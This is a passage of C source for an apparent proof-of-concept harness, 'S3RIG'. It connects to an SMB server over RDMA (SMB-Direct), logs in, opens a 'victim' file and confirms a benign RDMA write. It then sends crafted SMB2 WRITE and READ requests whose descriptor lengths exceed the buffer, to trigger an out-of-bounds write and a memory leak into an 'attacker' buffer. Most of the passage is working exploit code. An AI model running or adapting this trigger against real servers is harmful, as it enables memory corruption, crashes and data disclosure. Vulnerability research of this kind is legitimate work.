	if (rlen >= 144) {
		memcpy(&p->persistent_fid, rsp + 128, 8);
		memcpy(&p->volatile_fid, rsp + 136, 8);
		if (eof) memcpy(eof, rsp + 112, 8);
	}
	printf("S3RIG: CREATE '%s' status=0x%08x pfid=0x%llx vfid=0x%llx eof=%llu\n",
	       name, st, (unsigned long long)p->persistent_fid,
	       (unsigned long long)p->volatile_fid, (unsigned long long)(eof ? *eof : 0));
	fflush(stdout);
	return st == STATUS_SUCCESS ? 0 : -1;
}

static int smb2_read_plain(struct rig *r, struct trig_params *p, uint32_t length,
			   uint8_t *out, size_t *outlen)
{
	uint8_t pdu[256], rsp[2048];
	size_t rlen = 0;
	uint32_t st, dlen;
	uint8_t doff;

	memset(pdu, 0, sizeof(pdu));
	p->message_id++;
	put_hdr((struct smb2_hdr_w *)pdu, SMB2_READ_CMD, p);
	*(uint16_t *)(pdu + 64) = 49;
	pdu[66] = 0; pdu[67] = 0;
	*(uint32_t *)(pdu + 68) = length;
	*(uint64_t *)(pdu + 72) = 0;
	memcpy(pdu + 80, &p->persistent_fid, 8);
	memcpy(pdu + 88, &p->volatile_fid, 8);
	*(uint32_t *)(pdu + 96) = 0;
	*(uint32_t *)(pdu + 100) = 0;
	*(uint32_t *)(pdu + 104) = 0;
	*(uint16_t *)(pdu + 108) = 0;
	*(uint16_t *)(pdu + 110) = 0;
	pdu[112] = 0;

	if (smb2_xchg(r, pdu, 113, rsp, sizeof(rsp), &rlen)) return -1;
	st = rsp_status(rsp, rlen);
	if (st != STATUS_SUCCESS || rlen < 80) {
		printf("S3RIG: plain READ status=0x%08x len=%zu\n", st, rlen);
		fflush(stdout); return -1;
	}
	doff = rsp[66];
	memcpy(&dlen, rsp + 68, 4);
	if ((size_t)doff + dlen > rlen) return -1;
	if (dlen > *outlen) dlen = (uint32_t)*outlen;
	memcpy(out, rsp + doff, dlen);
	*outlen = dlen;
	return 0;
}

/* ---------------------------------------------------------------------- main */

static void usage(const char *a0)
{
	fprintf(stderr,
		"usage: %s -h <server-ip> [-P <port>] [-s <unc>] [-f <file>] [-u <user>]\n"
		"       [-p <password>] [-m control|dirA|dirB|all] [-b <buflen>]\n"
		"       [-0 <desc0>] [-1 <desc1>]\n", a0);
}

int main(int argc, char **argv)
{
	/* OpenSSL 3.x: load legacy provider for MD4 support */
	OSSL_PROVIDER_load(NULL, "legacy");
	OSSL_PROVIDER_load(NULL, "default");

	struct rig r;
	struct trig_params p;
	const char *host = NULL, *port = SMBD_PORT_DEFAULT;
	const char *unc = NULL, *file = "s3-victim.bin", *user = "s3guest";
	const char *password = "test", *mode = "all";
	char uncbuf[256];
	uint8_t pdu[512], rsp[1024], back[256];
	size_t pdulen, rlen = 0, blen;
	uint64_t eof = 0;
	uint32_t ctl_len = 64;
	int c, rc_control = -1;

	memset(&r, 0, sizeof(r));
	memset(&p, 0, sizeof(p));
	p.buflen    = TRIG_BUFLEN;
	p.desc0_len = TRIG_DESC0_LEN;
	p.desc1_len = TRIG_DESC1_LEN;

	while ((c = getopt(argc, argv, "h:P:s:f:u:p:m:b:0:1:")) != -1) {
		switch (c) {
		case 'h': host = optarg; break;
		case 'P': port = optarg; break;
		case 's': unc = optarg; break;
		case 'f': file = optarg; break;
		case 'u': user = optarg; break;
		case 'p': password = optarg; break;
		case 'm': mode = optarg; break;
		case 'b': p.buflen    = (uint32_t)strtoul(optarg, NULL, 0); break;
		case '0': p.desc0_len = (uint32_t)strtoul(optarg, NULL, 0); break;
		case '1': p.desc1_len = (uint32_t)strtoul(optarg, NULL, 0); break;
		default: usage(argv[0]); return 2;
		}
	}
	if (!host) { usage(argv[0]); return 2; }
	if (!unc) { snprintf(uncbuf, sizeof(uncbuf), "\\\\%s\\share", host); unc = uncbuf; }
	if (p.desc0_len <= p.buflen) {
		fprintf(stderr, "S3RIG: desc0_len (%u) must be > buflen (%u) or rw.c:143 never clamps\n",
			p.desc0_len, p.buflen);
		return 2;
	}

	printf("S3RIG: target %s:%s unc='%s' file='%s' user='%s' mode=%s\n", host, port, unc, file, user, mode);
	printf("S3RIG: params buflen=%u desc0=%u desc1=%u\n", p.buflen, p.desc0_len, p.desc1_len);
	fflush(stdout);

	if (rig_connect(&r, host, port)) {
		printf("S3RIG: READINESS rxe=no smbd_connected=no (rdma_cm connect failed)\n"); fflush(stdout); return 1;
	}
	printf("S3RIG: rdma connected via device '%s'\n", r.devname); fflush(stdout);

	if (smbd_negotiate(&r)) {
		printf("S3RIG: READINESS rxe=%s smbd_connected=no (smbd negotiate failed)\n",
		       strncmp(r.devname, "rxe", 3) ? "no" : "yes");
		fflush(stdout); return 1;
	}

	p.mr_addr = (uint64_t)(uintptr_t)r.abuf;
	p.mr_rkey = r.amr->rkey;
	p.message_id = 0;

	if (smb2_negotiate(&r, &p) || smb2_session_setup(&r, &p, user, password) ||
	    smb2_tree_connect(&r, &p, unc) || smb2_create(&r, &p, file, &eof)) {
		printf("S3RIG: READINESS rxe=%s smbd_connected=no (SMB2 staging failed)\n",
		       strncmp(r.devname, "rxe", 3) ? "no" : "yes");
		fflush(stdout); return 1;
	}

	printf("S3RIG: READINESS rxe=%s smbd_connected=yes\n",
	       strncmp(r.devname, "rxe", 3) ? "no" : "yes");
	fflush(stdout);

	/* B. CONTROL: a well-formed single-descriptor RDMA WRITE */
	{
		struct trig_params q = p;
		uint32_t i;
		for (i = 0; i < ctl_len; i++) r.abuf[i] = (uint8_t)(0xC0 + (i & 0x0f));
		q.message_id = ++p.message_id;
		q.buflen = ctl_len; q.desc0_len = ctl_len;
		pdulen = build_write_trigger(pdu, sizeof(pdu), &q, 1);
		if (!pdulen || smb2_xchg(&r, pdu, pdulen, rsp, sizeof(rsp), &rlen)) {
			printf("S3RIG: CONTROL benign_rdma_write=fail (exchange failed)\n"); fflush(stdout); return 1;
		}
		printf("S3RIG: control WRITE status=0x%08x\n", rsp_status(rsp, rlen)); fflush(stdout);
		if (rsp_status(rsp, rlen) != STATUS_SUCCESS) {
			printf("S3RIG: CONTROL benign_rdma_write=fail (status)\n"); fflush(stdout); return 1;
		}
		blen = sizeof(back);
		if (smb2_read_plain(&r, &p, ctl_len, back, &blen) || blen != ctl_len) {
			printf("S3RIG: CONTROL benign_rdma_write=fail (readback %zu bytes)\n", blen); fflush(stdout); return 1;
		}
		rc_control = memcmp(back, r.abuf, ctl_len);
		printf("S3RIG: CONTROL benign_rdma_write=%s\n", rc_control ? "fail" : "ok");
		hexdump("S3RIG: control readback", back, blen > 32 ? 32 : blen);
		fflush(stdout);
		if (rc_control) return 1;
	}

	if (!strcmp(mode, "control")) { printf("S3RIG: RUN-COMPLETE\n"); fflush(stdout); return 0; }

	/* C. THE FINDING, direction A */
	if (!strcmp(mode, "dirA") || !strcmp(mode, "all")) {
		memset(r.abuf, 0x41, ATTACKER_MR_SIZE);
		p.message_id++;
		pdulen = build_write_trigger(pdu, sizeof(pdu), &p, 2);
		printf("S3RIG: dirA SMB2 WRITE RemainingBytes=%u desc[0].length=%u "
		       "desc[1].length=%u -> OOB starts at data_buf+%u\n",
		       p.buflen, p.desc0_len, p.desc1_len, p.buflen);
		hexdump("S3RIG: dirA PDU", pdu, pdulen);
		rlen = 0;
		if (smb2_xchg(&r, pdu, pdulen, rsp, sizeof(rsp), &rlen)) {
			printf("S3RIG: TRIGGER dirA sent status=NORESPONSE "
			       "(connection died, check the server log)\n");
			fflush(stdout);
			printf("S3RIG: RUN-COMPLETE\n"); fflush(stdout); return 0;
		}
		printf("S3RIG: TRIGGER dirA sent status=0x%08x\n", rsp_status(rsp, rlen));
		fflush(stdout);
	}

	/* D. direction B */
	if (!strcmp(mode, "dirB") || !strcmp(mode, "all")) {
		struct trig_params q = p;
		memset(r.abuf, 0, ATTACKER_MR_SIZE);
		q.message_id = ++p.message_id;
		pdulen = build_read_trigger(pdu, sizeof(pdu), &q, p.buflen);
		printf("S3RIG: dirB SMB2 READ Length=%u desc[0].length=%u desc[1].length=%u\n",
		       p.buflen, q.desc0_len, q.desc1_len);
		rlen = 0;
		if (smb2_xchg(&r, pdu, pdulen, rsp, sizeof(rsp), &rlen)) {
			printf("S3RIG: TRIGGER dirB sent status=NORESPONSE\n"); fflush(stdout);
			printf("S3RIG: RUN-COMPLETE\n"); fflush(stdout); return 0;
		}
		printf("S3RIG: TRIGGER dirB sent status=0x%08x\n", rsp_status(rsp, rlen));
		hexdump("S3RIG: dirB attacker MR after the read", r.abuf, 256);
		fflush(stdout);
	}

	printf("S3RIG: RUN-COMPLETE\n"); fflush(stdout);
	return 0;
}
